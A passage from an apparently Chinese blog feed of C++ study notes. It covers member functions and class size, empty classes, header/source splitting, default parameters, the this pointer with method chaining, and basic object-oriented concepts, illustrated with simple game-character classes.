8的倍数，这是板上钉钉的事实。<br>但是类的内存占用呢，变量没办法，声明了就有，但是成员函数，不是每个对象都需要，它的内存占用该怎么办</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">sizeof</span>(Box);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/22/member/002.png" class=""><p>发现他在统计类的内存大小的时候，忽略掉了函数？</p><p>如果是以为没定义的话其实也陷进去了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hello \n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/22/member/003.png" class=""><p>发现还是忽略的。</p><p><strong>但是要注意：虽然统计类的大小时不计函数，但是函数本质上还是有占用的</strong></p><p>对象的大小按照数据成员所占空间之和算，和结构体类似。但是类中的函数，是类通用的，所以不算做对象的占用，因此成员函数也不存在对象的内存空间。换言之就可能在调用时才跳转到代码区什么的找到函数的地址。</p><hr><h2 id="空类的大小"><a href="#空类的大小" class="headerlink" title="空类的大小"></a>空类的大小</h2><p>然后就是另一个有意思的地方。当类是空的时候它的占用会是0吗</p><blockquote><p>ps: C++的空类是指这个类不带任何数据，即类中没有非静态(non-static)数据成员变量，没有虚函数(virtual function)，也没有虚基类(virtual base class)。 </p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">hack</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/22/member/004.png" class=""><p>可以看到结果是1.</p><p>其实也是因为<code>C++标准规定，凡是一个独立的(非附属)对象都必须具有非零大小。</code></p><p>不然这个类创建多个对象的时候，这几个不同的对象的内存地址是一样的不是很荒唐吗</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hack h1, h2;</span><br><span class="line">std::cout &lt;&lt; &amp;h1 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;h2 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/06/22/member/005.png" class=""><p>切成release模式才会相邻，debug可能还有啥没优化的挡着了。</p><hr><h2 id="构建class文件"><a href="#构建class文件" class="headerlink" title="构建class文件"></a>构建class文件</h2><p>vs的操作流程吧，因为类可能单独写在一个文件[一个源文件+一个头文件]里</p><img src="/2022/06/22/member/006.png" class=""><img src="/2022/06/22/member/007.png" class=""><p>就会得到一个源文件和一个头文件，这里Class类名以Hack举例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Hack.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Hack.h&quot;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Hack.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后可以用main.cpp 引入Hack的头文件，这样就能访问类。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Hack.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Hack::test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;test&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这样函数的定义部分也可在源文件操作。除了内联函数以外，我们尽量将内联函数写在头文件中，毕竟这个内联的简易的话它是直接拿来替换的，没必要让他翻几个文件再替换。</p></blockquote><hr><h2 id="重写原则"><a href="#重写原则" class="headerlink" title="重写原则"></a>重写原则</h2><p>因为函数可以只先声明，而后定义，所以最后参考的是定义部分</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Hack.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Hack::test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;test&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Hack::add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c = <span class="number">3</span>)</span></span>&#123;<span class="comment">//假如声明的时候已经给c做了默认值，那么此处在定义默认值就会报错</span></span><br><span class="line"><span class="keyword">return</span> hp + mp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实本质上是要注意默认参数的情况，虽然我们形参习惯放于函数声明的部分。<br>但是默认参数其实也可以放在声明的地方。</p><p>当默认参数放在声明部分时，定义的时候就不可以再重复出现默认参数了，否则会产生错误。</p><p>所以原则上：</p><ol><li>当定义和声明分开时，参数的默认值就尽量放在声明</li><li>定义和声明不分开的时候，就老老实实放着就行了。</li></ol><hr><h2 id="this"><a href="#this" class="headerlink" title="this"></a>this</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Hack.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Hack::test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;hp = <span class="number">200</span>;</span><br><span class="line"><span class="keyword">this</span>-&gt;mp = <span class="number">300</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;test&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果只在此处初始化的话其实跟<code>hp=200;</code>差别不大。</p><p>但是this的意义肯定不在于此，不然早就被废弃了。</p><blockquote><p>this指针是一个自动生成、自动隐藏的成员，当一个对象被实例化时，this指针自动指向对象的首地址</p></blockquote><p>比如说比较两个对象的某个参数，然后返回指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="type">int</span> lv;</span><br><span class="line"><span class="function">Hack *<span class="title">Hmax</span><span class="params">(Hack *ha)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Hack.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">Hack* <span class="title">Hack::Hmax</span><span class="params">(Hack *ha)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ha-&gt;lv &gt; lv ? ha : <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果说没有this指针，就不好确定比较的对象的地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Hack ha;</span><br><span class="line">Hack hc;</span><br><span class="line"></span><br><span class="line">hc.<span class="built_in">Hmax</span>(&amp;hc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样返回的还是一个指针，我们可以去接受它做其它有意义的事情。</p><hr><p>还有就是比如说传值初始化的时候this可以区分出来</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Hack::setHp</span><span class="params">(<span class="type">int</span> hp)</span></span>&#123;</span><br><span class="line">hp = hp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当形参名没有考究，跟类的成员名一样的时候，其实就给编译器整活了。但是你加上this的话就一目了然</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Hack::setHp</span><span class="params">(<span class="type">int</span> hp)</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;hp = hp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>this还有一种套娃用法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="type">int</span> lv;</span><br><span class="line"></span><br><span class="line"><span class="function">Hack &amp;<span class="title">setHp</span><span class="params">(<span class="type">int</span> hp)</span></span>;</span><br><span class="line"><span class="function">Hack &amp;<span class="title">setMp</span><span class="params">(<span class="type">int</span> mp)</span></span>;</span><br><span class="line"><span class="function">Hack &amp;<span class="title">setLv</span><span class="params">(<span class="type">int</span> lv)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Hack.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">Hack&amp; <span class="title">Hack::setHp</span><span class="params">(<span class="type">int</span> hp)</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;hp = hp;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Hack &amp;<span class="title">Hack::setMp</span><span class="params">(<span class="type">int</span> mp)</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;mp = mp;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Hack &amp;<span class="title">Hack::setLv</span><span class="params">(<span class="type">int</span> lv)</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;lv = lv;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Hack ha;</span><br><span class="line">ha.<span class="built_in">setHp</span>(<span class="number">200</span>).<span class="built_in">setMp</span>(<span class="number">300</span>).<span class="built_in">setLv</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会发现可以连起来用。因为它的返回值是this指针，所以当ha开始调用的时候，只要后面的参数也返回的this指针就可以一直套娃套下去。这一种就像类的连续初始化版~</p><p>当然还是要归功于引用这一特性，如果没有引用，就没法返回一个解引用之后还原成this的指针。<br>不能返回指针，而是返回类的话，是会存在大量的内存消耗的一个问题。<br>就跟结构体那会提到的类似，返回一个结构体和返回一个结构体指针肯定是不一样的，返回结构体指针还原出本身，和新建临时对象返回。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>熟悉下定义类的成员函数定义方式，和this指针的巧妙运用。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面向对象</title>
      <link href="/2022/06/22/oop/"/>
      <url>/2022/06/22/oop/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>面向过程的语法基本复习完了，能记多少全凭天意。<br>然后就是c++面向对象的特性了，主要是从class类的角度。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>OOP(Object Oriented Programming)即面向对象编程。本质上还是一种思想，通过编程中的事物抽象成对象编程。<br>与此相关的名词还有OOD(面向对象设计)、OOA(面向对象分析)等。</p><hr><p>学c++的时候就知道它兼容c语言特性，所以外界的声音就是c++不单单是面向对象的语言。<br>像java、c#可能就是纯面向对象语言的代表了。</p><p>不过毕竟是一种思想抽象，所以也不能百分之百说就是面向对象好，面向对象不好。还是要取决于使用场景。</p><hr><h2 id="面向过程"><a href="#面向过程" class="headerlink" title="面向过程"></a>面向过程</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">NPC</span>&#123;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="type">char</span> *name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">MONSTER</span>&#123;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="type">char</span> *name;</span><br><span class="line"><span class="type">int</span> damage;</span><br><span class="line"><span class="type">unsigned</span> price;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ROLE</span>&#123;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="type">char</span> *name;</span><br><span class="line"><span class="type">int</span> damage;</span><br><span class="line"><span class="type">unsigned</span> diamond;</span><br><span class="line"><span class="type">char</span> *id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Act</span><span class="params">(ROLE &amp;acter, ROLE &amp;beacter)</span></span>&#123;</span><br><span class="line">beacter.hp -= acter.damage;</span><br><span class="line"><span class="keyword">return</span> beacter.hp &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看面向过程的时候，结构体定义这种人物，函数定义行为或者进行的操作，比如砍了他一下扣多少血之类的。<code>ROLE zs,ls。 Act(zs,ls)</code></p><blockquote><p>当然稍大的项目，使用c++开发的话，就不会完成使用面向对象的思想，面向过程固然有用武之处</p></blockquote><hr><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>封装就是可以把已有的事物封装成类，这种类可以让指定的属性被外人看到，也可以设置一些不能被外人多看到的属性。<br>换做代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">box</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">box</span>();</span><br><span class="line">~<span class="built_in">box</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="comment">//protected:</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>有公有的区域，也有私有的区域。</p></blockquote><hr><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>继承就是让一个类的对象可以获取另一个类的对象的属性。能够按照一定的等级划分。<br>被继承的类可以称为“基类”、“父类”。<br>通过继承创建的类一般被称为“子类”、“派生类”的说法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>&lt;派生类名&gt;:&lt;继承方式&gt;&lt;基类名&gt;&#123;</span><br><span class="line">    &lt;派生类新定义成员&gt;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//例如：</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">box</span>();</span><br><span class="line">~<span class="built_in">box</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">box1</span>:<span class="keyword">public</span> box&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>是对一个类的实例在相同方法，不同情形下有不同的表现。<br>多态是在继承的基础上实现。</p><blockquote><p>后面在拆开解</p></blockquote><hr><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> 类名&#123;</span><br><span class="line">    <span class="keyword">public</span>:     <span class="comment">//公有对象</span></span><br><span class="line">    <span class="keyword">private</span>:    <span class="comment">//私有对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在封装继承多态的时候举例了代码，定义一个类的模板就是如此。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> 结构体名称&#123;</span><br><span class="line">    <span class="comment">//成员...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其实从结构体和类来比较，大致上有相似的感觉，只不过类还能划分对象，还有一些高级的功能。<br>而且虽然结构体也能塞函数，但是不太好，毕竟设计的目的就是为了涵盖一些变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ROLE</span>&#123;</span><br><span class="line">    <span class="type">int</span> hp;</span><br><span class="line">    <span class="type">int</span> mp;</span><br><span class="line">    <span class="type">int</span> damagel</span><br><span class="line">    <span class="type">int</span> diamond;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ROLE zs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在没有定义<code>public:</code>的时候，类的成员都是私有的，未公开。像结构体默认就是公有的。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ROLE</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> hp;</span><br><span class="line">    <span class="type">int</span> mp;</span><br><span class="line">    <span class="type">int</span> damage;</span><br><span class="line">    <span class="type">int</span> diamond;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ROLE zs&#123;<span class="number">100</span>,<span class="number">200</span>,<span class="number">100</span>,<span class="number">100</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这样才能合理初始化。</p></blockquote><p>一个角色除了基础属性外，还会有回复的能力</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ROLE</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="type">int</span> damage;</span><br><span class="line"><span class="type">int</span> diamond;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> hpadd;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Init</span><span class="params">()</span></span>&#123;</span><br><span class="line">hpadd = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当然这种每秒回多少，我们肯定不希望被其他人访问修改。所以将这个变量放入<code>private:</code>中。<br>不过每次初始化要调用的函数放到里面的话不利于调用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ROLE</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="type">int</span> damage;</span><br><span class="line"><span class="type">int</span> diamond;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Init</span><span class="params">()</span></span>&#123;</span><br><span class="line">hpadd = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> hpadd;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样一来，每次创建一个对象，都可以通过<code>对象.Init();</code>去初始化这个hpadd。</p><p>然后就是关于对象定义的问题，公有变量都存在public中，但是它可以多次定义：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 